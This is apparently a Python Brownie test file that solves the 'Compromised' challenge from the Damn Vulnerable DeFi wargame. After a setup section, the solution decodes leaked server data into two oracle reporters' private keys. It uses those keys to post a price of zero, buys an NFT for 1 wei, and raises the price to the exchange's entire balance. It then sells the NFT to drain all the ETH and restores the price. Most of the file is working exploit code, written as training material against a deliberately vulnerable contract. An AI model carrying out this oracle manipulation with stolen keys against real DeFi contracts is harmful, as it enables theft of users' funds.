from scripts.utils import *
from brownie import Exchange, DamnValuableNFT, TrustfulOracle, TrustfulOracleInitializer

def test_solve_challenge():
    ####################################################################
    ######### SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE #########
    ####################################################################
    web3 = import_web3()

    # sources
    sources = [
        '0xA73209FB1a42495120166736362A1DfA9F95A105',
        '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
        '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
    ]

    # tokens in pool and token initial supply
    exchange_initial_eth_balance = ether_to_wei(9990)
    initial_nft_price = ether_to_wei(999)

    # import accounts
    deployer, _fromDeployer, attacker, _fromAttacker = define_from_acc(qty=2)

    # set balance of sources accounts
    for address in sources:
        set_account_balance_network(address, hex(ether_to_wei(2)))
        # check sources balances
        assert web3.eth.get_balance(address) == ether_to_wei(2)

    # make the attacker balance 0.1 ETH
    set_account_balance_network(attacker.address, hex(ether_to_wei(0.1)))
    # check attacker balance
    assert attacker.balance() == ether_to_wei(0.1)

    # deploy the contracts
    trustful_oracle_initializer = TrustfulOracleInitializer.deploy(sources, ["DVNFT", "DVNFT", "DVNFT"], [initial_nft_price, initial_nft_price, initial_nft_price], _fromDeployer)
    oracle = TrustfulOracle.at(trustful_oracle_initializer.oracle())
    exchange = Exchange.deploy(oracle.address, _fromDeployer | value_dict(exchange_initial_eth_balance))
    nft_token = DamnValuableNFT.at(exchange.token())

    # check if solved
    def check_solution():
        ############################################
        ############ SUCCESS CONDITIONS ############
        ############################################

        # Exchange must have lost all ETH
        assert exchange.balance() == 0

        # Attacker's ETH balance must have significantly increased
        assert attacker.balance() > exchange_initial_eth_balance

        # Attacker must not own any NFT
        assert nft_token.balanceOf(attacker.address) == 0

        # NFT price shouldn't have changed
        assert oracle.getMedianPrice("DVNFT") == initial_nft_price
        
# #########################################################
# While poking around a web service of one of the most popular DeFi projects in the space, you get a somewhat strange response from their server. This is a snippet:
#
# ```````````````````````````````````````````````
#   HTTP/2 200 OK
#   content-type: text/html
#   content-language: en
#   vary: Accept-Encoding
#   server: cloudflare
#
#   4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35
#
#   4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
# ````````````````````````````````````````````````
#
# A related on-chain exchange is selling (absurdly overpriced) collectibles called "DVNFT", now at 999 ETH each
#
# This price is fetched from an on-chain oracle, and is based on three trusted reporters:
# 0xA73209FB1a42495120166736362A1DfA9F95A105
# 0xe92401A4d3af5E446d93D11EEc806b1462b39D15
# 0x81A5D6E50C214044bE44cA0CB057fe119097850c
#
# Starting with only 0.1 ETH in balance, you must steal all ETH available in the exchange.
# #########################################################

    ##############################
    ##### SOLUTION GOES HERE #####
    ##############################

    # decode base64
    from base64 import b64decode
    
    # first encoded response
    responses = [
        "4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35",
        "4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34"
    ]

    # loop over responses
    _fromLeakedAcc = []
    for response in responses:
        # obtain base64 decoded response
        base64_response = bytes.fromhex(response.replace(' ','')).decode('utf-8')

        # add leaked account
        _fromLeakedAcc.append({'from':accounts.add(private_key=hex(int(b64decode(base64_response),16)))})

    # use leaked accounts to post a price of zero
    oracle.postPrice("DVNFT",0, _fromLeakedAcc[0])
    oracle.postPrice("DVNFT",0, _fromLeakedAcc[1])

    # buy the NFTs for 1 wei, as the median price of (990,0,0) is 0
    exchange.buyOne(_fromAttacker | value_dict(1))

    # manipulate the price so that it's the total exchange balance
    oracle.postPrice("DVNFT", exchange.balance(), _fromLeakedAcc[0])
    oracle.postPrice("DVNFT", exchange.balance(), _fromLeakedAcc[1])

    # approve the token to be moved by the exchange
    nft_token.approve(exchange.address, 0, _fromAttacker)

    # then sell
    exchange.sellOne(0, _fromAttacker)

    # return price to normal
    oracle.postPrice("DVNFT",ether_to_wei(999), _fromLeakedAcc[0])
    oracle.postPrice("DVNFT",ether_to_wei(999), _fromLeakedAcc[1])

    ######################
    check_solution()
